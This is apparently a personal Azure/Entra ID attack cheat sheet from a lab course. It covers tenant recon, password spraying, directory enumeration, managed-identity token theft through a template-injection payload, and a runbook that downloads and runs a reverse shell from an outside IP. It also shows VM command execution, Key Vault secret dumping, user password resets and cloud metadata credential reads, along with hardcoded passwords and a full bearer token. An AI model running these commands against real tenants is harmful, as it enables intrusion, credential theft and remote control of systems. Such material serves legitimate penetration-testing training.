# Connect
##
## https://gist.github.com/Jasemalsadi/f7fac6a799763b8fd67737f0e7b63ae4
##

$passwd = ConvertTo-SecureString "NewUserSSecret@Pass61" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("AS-5945632460@oilcorptarsands.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
#Connect-AzureAD -Credential $creds
Connect-MgGraph -ClientSecretCredential $creds -TenantId bcdc6c96-4f80-4b10-8228-2e6477c71851 

## 1. Unauthenticated Recon:
    #Get if Azure tenant is in use, tenant name and Federation
    https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1
    #Get the Tenant ID
    https://login.microsoftonline.com/[DOMAIN]/.wellknown/openid-configuration
    #Validate Email ID by sending requests to
    https://login.microsoftonline.com/common/GetCredentialType

    Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
    # Get tenant name, authentication, brand name (usually same as directory name) and domain name
    Get-AADIntLoginInformation -UserName User8829957150027433301@defcorpspace.onmicrosoft.com
    # Get tenant ID
    Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com

    # Get tenant domains
    Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com
    Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
    Get-AADIntTenantDomains -Domain microsoft.com

    # Get all the information
    Invoke-AADIntReconAsOutsider -DomainName defcorpplanetary.onmicrosoft.com

    # Validate emails we gathered 
    PS C:\AzAD\Tools> C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt

    # microbust: open services 
    Import-Module .\MicroBurst\MicroBurst.psm1
    PS C:\AzAD\Tools> Invoke-EnumerateAzureSubDomains -base defcorpspace -Verbose
    Invoke-EnumerateAzureBlobs -base defcorpspace -Verbose

    # Spray with password 
    . C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1
    Invoke-MSOLSpray -UserList .\emails.txt -Password V3ryH4rdt0Cr4ckN0OneC@nGu355ForT3stUs3r -Verbose
## 2. authenticated Recon:
    # 2.1 Azure PS Module
        Import-Module C:\AZAD\Tools\AzureAD\AzureAD.psd1  
        $creds = Get-Credential
        Connect-AzureAD -Credential $creds  
        # Get the current session state
        Get-AzureADCurrentSessioninfo
        # Get details of the current tenant
        Get-AzureADTenantDetail
        ############
        # Get current user groups 
        $currentUser = (Get-AzADUser -SignedIn)
        $currentUser = Get-AzureADUser -ObjectId  AS-5945632460_oilcorptarsands.onmicrosoft.com#EXT#@oilcorpfracking.onmicrosoft.com
        Get-AzureADUserOwnedObject -ObjectID $currentUser.UserPrincipalName
        Get-AzureADDirectoryRole | Where-Object { (Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId).ObjectId -contains $currentUser.Id }
        Get-AzureADUserMembership -ObjectId   $currentUser.UserPrincipalName

        # Enumearte users
        Get-AzureADUser -All $true
        Get-AzureADUser -All $true | select UserPrincipalName
        #Get users whose member of global admins : EXT means it's external user. So only admin is internal one. 
        Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
        #Enumerate a specific user
        Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com
        #Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
        Get-AzureADUser -SearchString "admin"
        #Search for users who contain the word "admin" in their Display name:
        Get-AzureADUser -All $true |?{$_.Displayname "admin" }    
        # Search attributes for all users that contain the string "password":
        Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
        # All users who are synced from on-prem
        Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
        #All users who are from Azure AD
        Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
        #Objects created by any user (use -ObjectId for a specific user)
        Get-AzureADUser | Get-AzureADUserCreatedObject
        #Objects owned by a specific user
        Get-AzureADUserOwnedObject -ObjectId test@defcorphq.onmicrosoft.com 
        ############

        # Enumerate groups
        Get-AzureADGroup -All $true
        # Search for group by name
        # Get Groups from on-premise
        Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
        Get-AzureADGroup -SearchString "admin" | fl *
        # Get members of the group
        Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e 
        # Get groups and roles a user has:
        Get-AzureADUser -SearchString 'User8829957150027433301' | Get-AzureADUserMembership
        Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
        ############  

        # Enumerate Roles
        # Get all available role templates
        Get-AzureADDirectoryroleTemplate
        # Get all enabled roles (a built-in role must be enabled before usage)
        Get-AzureADDirectoryRole
        # For certain role (e.g. global administrator), geet the directory members
        Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
        # Get all custom roles
        Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
        Connect-AzureAD
        Get-AzureADMSRoleDefinition  |?{$_.IsBuiltIn -ne $true}
        ############

        # More indepth user groups and the groups member, apps details 
        Get-AzureADApplication -All $true | % {
            Get-AzureADApplication -ObjectId $_.ObjectId | fl *
            Write-Output "-----------------------"
            }
    
    
        Get-AzureADUserMembership -ObjectId   $currentUser.UserPrincipalName | %{
                    $_ | fl *
                    Write-Output "-----------Members------------"
                    Get-AzureADGroupMember -ObjectId $_.ObjectId | fl *
                    Write-Output "-----------------------"
            }
        Get-AzureADUserMembership -ObjectId   frackingadmin@oilcorpfracking.onmicrosoft.com | %{
                    $_ | fl *
                    Write-Output "-----------Members------------"
                    Get-AzureADGroupMember -ObjectId $_.ObjectId | fl *
                    Write-Output "-----------------------"
            }
            
        # less detailed    
        Get-AzureADGroup -All $true | % {
                    $_ | fl *
                    Write-Output "-----------Members------------"
                    Get-AzureADGroupMember -ObjectId $_.ObjectId
                    Write-Output "-----------------------"
            }
        # more detailed
        Get-AzureADGroup -All $true | % {
                    $_ | fl *
                    Write-Output "-----------Members------------"
                    Get-AzureADGroupMember -ObjectId $_.ObjectId | fl *
                    Write-Output "-----------------------"
            } 

        # Enumerate Azure devices:
        Get-AzureADDevice -All $true | fl * 
        # Get Device configuration
        Get-AzureADDeviceConfiguration | fl *
        # List all active (not stale) devices
        Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
        #List Registered owners of all the devices
        Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
        Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
        #List Registered users of all the devices
        Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
        Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}} 
        #List devices owned by a user
        Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com        
        #List devices registered by a user
        Get-AzureADUserRegisteredDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com        
        #List devices managed using Intune
        Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"} 
        ############

        # Enumerate Azure Apps:
        # Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app. 
        Get-AzureADApplication -All $true
        # Get all the details about an application
        Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145- 155a069ebed0 | fl *
        # Filtre App based on disaplay name
        Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"} 
        # List all the apps with app password, but password value is not shown -by design-:
        Get-AzureADApplication -All $true | %{if(GetAzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
        # Get owner of an application
        Get-AzureADApplication -ObjectId a1333e88-1278-41bf8145-155a069ebed0 | Get-AzureADApplicationOwner |fl *
        # Get Apps where a User has a role (exact role is not shown) on them (apps)
        Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
        # Get Apps where a Group has a role (exact role is not shown) on them (apps)
        Get-AzureADGroup -ObjectId 57ada729-a581-4d6f-9f16- 3fe0961ada82 | Get-AzureADGroupAppRoleAssignment | fl *
        ############

        # Enumerate Service Principals/ Enterprise Apps - SPs can be assigned a roles
        # Get all service principals
        Get-AzureADServicePrincipal -All $true
        # Get all details about a service principal
        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *
        # Get an service principal based on the display name
        Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
        # List all the service principals with an application password
        Get-AzureADServicePrincipal -All $true | %{if(Get-AzureADServicePrincipalKeyCredential - ObjectID $_.ObjectID){$_}}
        # Get owner of a service principal
        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45- 053e7c37a264 | Get-AzureADServicePrincipalOwner |fl *
        # Get objects owned by a service principal
        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwnedObject
        # Get objects created by a service principal
        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45- 053e7c37a264 | Get-AzureADServicePrincipalCreatedObject  
        # Get group and role memberships of a service principal
        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611- 4442-8f45-053e7c37a264 | GetAzureADServicePrincipalMembership |fl *

    # 2.2 AZ PS Module
        # Connection 
        Connect-AzAccount
        ############

        # General enumeration 
        # Get the information about the current context (Account, Tenant,Subscription etc.)
        Get-AzContext
        # List all available contexts
        Get-AzContext -ListAvailable
        # Enumerate subscriptions accessible by the current user
        Get-AzSubscription
        # Enumerate all resources visible to the current user
        Get-AzResource
        # Enumerate all Azure RBAC role assignments
        Get-AzRoleAssignment
         ############

        # Enumerate users
        # Enumerate all users
        Get-AzADUser
        # Enumerate a specific user
        Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
        # Search for a user based on string in first characters of DisplayName (wildcard not supported)
        Get-AzADUser -SearchString "admin"
        # Search for users who contain the word "admin" in their Display name:
        Get-AzADUser |?{$_.Displayname -match "admin"}
        # Get user role assigments (ouboun roles):
        Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com
        ############

        # Enumerate Groups
        # List all groups
        Get-AzADGroup
        # Enumerate a specific group
        Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
        # Search for a group based on string in first characters of DisplayName (wildcard not supported)
        Get-AzADGroup -SearchString "admin" | fl *
        # To search for groups which contain the word "admin" in their name:
        Get-AzADGroup |?{$_.Displayname -match "admin"}
        # Get members of a group
        Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
        # Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal)
        ############

        # Enumerate Apps
        Get-AzADApplication
        # Get all details about an application
        Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0
        # Get an application based on the display name
        Get-AzADApplication | ?{$_.DisplayName -match "app"}
        # Get app services 
        Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
        # List all the apps with an application password
        Get-AzADApplication | %{if(Get-AzADAppCredential -ObjectID $_.ID){$_}
        # Function apps
        Get-AzFunctionApp
        # Get storage account
        Get-AzStorageAccount |fl
        # Key valuts
        Get-AzKeyVault
        ############

        # Enumerate Service Principals         
        # Get all service principals
        Get-AzADServicePrincipal
        # Get all details about a service principal
        Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45- 053e7c37a264
        #Get a service principal based on the display name
        Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
    # 2.3 AZ cli
        # Connection
        az login 
        # If the user has no permissions on the subscription
        az login -u User8829957150027433301@defcorpspace.onmicrosoft.com -p [C@d8e6b6 --allow-no-subscriptions
        az configure
        # To find popular commands for VMs
        az find "vm"
        ############

        # General Information 
        # Get details of the current tenant (uses the account extension)
        az account tenant list
        # Get details of the current subscription (uses the account extension)
        az account subscription list
        # List the current signed-in user (whoami)
        az ad signed-in-user show
        ############

        # Enumerate users   
        az ad user list
        # select only username and show content in better format
        az ad user list --query "[].[displayName]" -o table 
        # Specific user
        az ad user show --id test@defcorphq.onmicrosoft.com 
        # Search for users who contain the word "admin" in their Display name (case sensitive):
        az ad user list --query "[?contains(displayName,'admin')].displayName"
        # Search for users , Case not senstive search 
        az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"} 
        # All users who are synced from on-prem
        az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
        # Users from azure
        az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
        # List username and displayname is custom names
        az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
        ############
        
        # Enumerate AAD Groups
        # List all Groups
        az ad group list
        az ad group list --query "[].[displayName]" -o table   
        # Enumerate a specific group using display name or object id
        az ad group show -g "VM Admins"
        az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e
        # Search for admin Group (case not senstive)
        az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"} 
        # Groups from on-prem
        az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
        # Groups from azure ad
        az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
        # Get members of a group
        az ad group member list -g "VM Admins" --query "[].[displayName]" -o table 
        # Check if a user is member of the specified group
        az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787
        # Get the object IDs of the groups of which the specified group is a member
        az ad group get-member-groups -g "VM Admins" 
        ############
    
        # VMs And Web Apps  
        az vm list
        az webapp list
        # Filter only names: 
        az vm list --query "[].[name]" -o table
        az functionapp list --query "[].[name]"  -o table
        # List VMs in table format
        az vm list  -o table
        # List  interfaces name for certain VM, e.g. networkInterfaces/bkpadconnect368
        az vm nic list --vm-name bkpadconnect  --resource-group ENGINEERING
        # Get al App Regisrations
        az ad app list
        az ad app list --query "[].[displayName]" -o table
        # Get all details about an application using identifier uri, application id or object id
        az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
        # • Get an application based on the display name (Run from cmd)
        az ad app list --query "[?contains(displayName,'app')].displayName"
        # Search for certain app (case not sensttive)
        az ad app list | ConvertFrom-Json | %{$_.displayName -match "slack"} 
        # Get owner of an application
        az ad app owner list --id a1333e88-1278-41bf-8145- 155a069ebed0 --query "[].[displayName]" -o table
        # List app has passowrd creds
        az ad app list --query "[?passwordCredentials !=null].displayName"  
        # List apps that have key credentials (use of certificate authentication)
        az ad app list --query "[?keyCredentials !=null].displayName"
        ############

        # Enumerate Service Principals
        # Get all SPs
        az ad sp list --all
        az ad sp list --all --query "[].[displayName]" -o table
        # Get Details about certain SP
        az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
        # Get SP based on display name
        az ad sp list --all --query "[?contains(displayName,'app')].displayName"
        # Search for certain SP by name (case non senstive )
        az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}
        # Get owner of SP
        az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query "[].[displayName]" -o table 
        # Get SPs owned by current user
        az ad sp list --show-mine
        # Get SPs with password creds
        az ad sp list --all --query "[?passwordCredentials != null].displayName" 
        # List apps that have key credentials (use of certificate authentication)
        az ad sp list -all --query "[?keyCredentials != null].displayName"
        ############
        # Enumerate users utilizing AT from phishing consent Grant attack :
        $URI = 'https://graph.microsoft.com/v1.0/users'
        $RequestParams = @{
         Method = 'GET'
         Uri = $URI
         Headers = @{
         'Authorization' = "Bearer $Token"
         }
        }
        (Invoke-RestMethod @RequestParams).value
        # Token Riding of MI
        # Get subscription id: 
        $Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyIsImtpZCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE3MDc4OTg5NzksIm5iZiI6MTcwNzg5ODk3OSwiZXhwIjoxNzA3OTg1Njc5LCJhaW8iOiJFMlZnWU9oaldCSjVPajdTOUhsTGZLZGpUdXBSQUE9PSIsImFwcGlkIjoiMmU5MWE0ZmUtYTBmMi00NmVlLTgyMTQtZmEyZmY2YWE5YWJjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiMzBlNjc3MjctYThiOC00OGQ5LTgzMDMtZjI0NjlkZjk3Y2IyIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJQRUFBQS4iLCJzdWIiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJlNVVaUGp2V1YwaTdkaFZTX2luRUFBIiwidmVyIjoiMS4wIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.Zx_eMGGRmEh7l13sS_PICluwf51CZeBpBILgTxjIZogZNcyb3W0PBcNGnEay6AC4xYA5H3oJ7yKNUVwhsOZ0fs-j-olo5_PUMSlxWn0Wg0SN8p_UHKCbd73PHh4f7GQrA0SFlOIxnCljFrF6cBVEPYVJZR-ojPTkoAYzWEAz9AFIz3xmYEyYG5qvNKPLro-mYw11vnjI_wpse-qe2ypRhHQStz8tcLcE7DpQrnbrwgdd8fw5q8EF5wLZy0vTxWK--fIvRXhuvac4a9s7gAPSGCqNGSPrWHn1-u7oNjRtdTXl03vQK8RoOiZNpp1X4qlPWb4yzHhDXe27UXXa0SYc_g"
        $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
            'Authorization' = "Bearer $Token"
            }
           }
           (Invoke-RestMethod @RequestParams).value 
        # From subscription id, List all Resources   
        $URI = 'https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resources?api-version=2020-10-01'
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
            'Authorization' = "Bearer $Token"
            }
           }
           (Invoke-RestMethod @RequestParams).value | fl 
        # List permission of certain resrouce   
        # /subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Exploration/providers/Microsoft.KeyVault/vaults/GISAppVault
              # 2015 API version
              $Token = (Get-AzAccessToken).Token
              $URI ='https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-hmvxqpuyzl3343455/providers/Microsoft.KeyVault/vaults/asegfdnurqpj3343460/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
              $RequestParams = @{
                  Method = 'GET'
                  Uri = $URI
                  Headers = @{
                  'Authorization' = "Bearer $Token"
                  }
                 }
             (Invoke-RestMethod @RequestParams).value | fl 
            # 2022 version (More results)
            $KeyVault = Get-AzKeyVault
            $SubscriptionID = (Get-AzSubscription).Id
            $ResourceGroupName = $KeyVault.ResourceGroupName
            $KeyVaultName = $KeyVault.VaultName
            $URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            $RequestParams = @{
               Method = 'GET'
               Uri = $URI
               Headers = @{
                'Authorization' = "Bearer $Access_Token"
                }
            }
            $Permissions = (Invoke-RestMethod @RequestParams).value
            $Permissions | fl *
        
        # if you graph token or you can reterive it, we can get apps MI has access to it: 
            $Token = $graphToken
            $URI = ' https://graph.microsoft.com/v1.0/applications'
            $RequestParams = @{
                Method = 'GET'
                Uri = $URI
                Headers = @{
                'Authorization' = "Bearer $Token"
                }
               }
            (Invoke-RestMethod @RequestParams).value
             {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
    # Curl using python : 
    import os
    import json
    
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    
    cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    
    val = os.popen(cmd).read()
    
    print("[+] Management API")
    print("Access Token: "+json.loads(val)["access_token"])
    print("ClientID: "+json.loads(val)["client_id"])
    
    cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    
    val = os.popen(cmd).read()
    print("\r\n[+] Graph API")
    print("Access Token: "+json.loads(val)["access_token"])
    print("ClientID: "+json.loads(val)["client_id"])
    
    # Get access token for AAD graph = GraphAccessToken in Az PS , also token used for AzureAD PS
    az account get-access-token --resource-type aad-graph
    # Get Access token for ARM graph == -AccessToken  in AZ PS
    az account get-access-token
    # riding the session utilizing the token 
    Connect-AzAccount -AccessToken $Token -GraphAccessToken $graphToken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
    

    # Lateral movement runbook  : 
    # rev_shell_17.ps1 Content
    iex (New-Object Net.Webclient).downloadstring('http://172.16.150.17:82/InvokePowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.17 -Port 4448
    # or :
    powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.17:82/InvokePowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.17 -Port 4448

    Import-AzAutomationRunbook -Name student17 -Path C:\AzAD\Tools\rev_shell_17.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -LogVerbose $true -LogProgress $true -Force
    Publish-AzAutomationRunbook -RunbookName student17 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
    nc -nvlp 4445
    Start-AzAutomationRunbook -RunbookName student17 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose -Wait
    # for any error and troubleshoot
    Get-AzAutomationJobOutput -Id job_id  -ResourceGroupName Engineering -AutomationAccountName HybridAutomation -Stream "Any"
    # Export runbook 
    Export-AzAutomationRunbook -Name ManageAWS -AutomationAccountName ManageMultiCloud -ResourceGroupName Refining -Slot Published -OutputFolder C:\AzAD\Tools\

    # Read Runbook Job output
    $JobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"
    $URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/jobs/$JobId/output?api-version=2023-11-01"
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $accesstoken"
        }
    }
    (Invoke-RestMethod @RequestParams)
    # Get permissions on runbook
    $URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $accesstoken"
        }
    }
    $Permissions = (Invoke-RestMethod @RequestParams).value
    $Permissions | fl *
    $Permissions.actions | fl *

    # Get Runbook Job Output
        $JobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"
        $URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/jobs/$JobId/output?api-version=2023-11-01"
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
                'Authorization' = "Bearer $accesstoken"
            }
        }
        (Invoke-RestMethod @RequestParams)
    # Export Runbook job code
        Export-AzAutomationRunbook -Name ManageAWS -AutomationAccountName ManageMultiCloud -ResourceGroupName Refining -Slot Published -OutputFolder C:\AzAD\Tools\

    # Code execution over VM 
    Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose 

    # Get public IP of VM (good when u have codeexec permission on VM)
    # Get interface name
    Get-AzVM -Name infradminsrv -ResourceGroupName Research |  select -ExpandProperty NetworkProfile
    # Get the Public IP object name 
         # bkpadconnect368  came from previous output ...Microsoft.Network/networkInterfaces/bkpadconnect368
    Get-AzNetworkInterface -Name bkpadconnect368
    # Get Public IP value 
    # bkpadconnectIP came from previous output..Microsoft.Network/publicIPAddresses/bkpadconnectIP
    Get-AzPublicIpAddress -Name bkpadconnectIP
    # You gonna find the value in IpAddress field. 

    # WinRM conection : 
    # You need to add user to the VM, so u can use it to auth with winrm
    Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose 
    $password = ConvertTo-SecureString 'Stud17Password@123' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('student17', $Password)
    $sess = New-PSSession -ComputerName 10.0.1.5 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
    Enter-PSSession $sess   
    # Important if didnt, you have to do .\username  like this to make it clear it's local user . means local not domain , then \ for username: 
[51.116.180.87]: PS C:\Users> $creds = New-Object System.Management.Automation.PSCredential('.\student17', $Password)
[51.116.180.87]: PS C:\Users> $infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds


    # Keyvault can be enumerrated with only ARM token but revealing secrets needs to request keyvault token           
    # Keyvault AT request: 
    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER 
    # Then request again ARM AT:
    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER            
    # Connect 
    Connect-AzAccount -AccessToken $MIARMAT -KeyVaultAccessToken $MIKVAT -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
    # Get the keyvault secert:
    Get-AzKeyVaultSecret -VaultName ResearchKeyVault
    # Get secret content (assume we found reader secret)
    Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText           


    # If we found custom role: e.g. "RoleDefinitionName: Virtual Machine Command Executor"
    # Usually work with users (not MI)
    Get-AzRoleAssignment
    # we can get it's definiation
    Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
    # Same thing for custom group 
    Get-AzADGroup -DisplayName 'VM Admins'
    # Get group members 
    Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select DisplayName
    
    # List roles and groups user (VMContributorX@defcorphq.onmicrosoft.com) is member of
    # Need MS graph token 
    $Token= (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
    $URI = 'https://graph.microsoft.com/v1.0/users/student17@defcorphq.onmicrosoft.com/memberOf'
    $RequestParams = @{
    Method = 'GET'
    Uri = $URI
    Headers = @{
        'Authorization' = "Bearer $Token"
                }
    }
    (Invoke-RestMethod @RequestParams).value 
    # if you found Administrative unit, pass it's id : 
    Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
    # Get administrative unit members , id from display name of previous command
    Get-AzureADMSAdministrativeUnitMember -Id e1e26d93-163e42a2-a46e-1b7d52626395
    # Get which user/group/object has out role over administrative unit member
    Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl
    # Reset password for certain user
    $password = "VM@Contributor@123@321" | ConvertTo-SecureString  -AsPlainText -Force
    (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password -Verbose
    
    # AD joined device:
    # Check if machine joined 
        dsregcmd /status
    # Get user data from the joined machine:
        $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
        [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
    # Another way
        (iwr http://169.254.169.254/latest/user-data -UseBasicParsing).RawContent
    # check if EC2 
        (iwr http://169.254.169.254/latest/meta-data/hostname -UseBasicParsing).Content
        (iwr http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance -UseBasicParsing).Content
    # Get proccesses with username and id,procName
        (Get-Process -IncludeUserName ) | % {[PSCustomObject]@{
            procName = $_.ProcessName
            username = $_.UserName
            Id = $_.Id
        }
        }
    # Dump word/Powerpoint/OneDrive AT
        # Get all the tools to dump it from disk
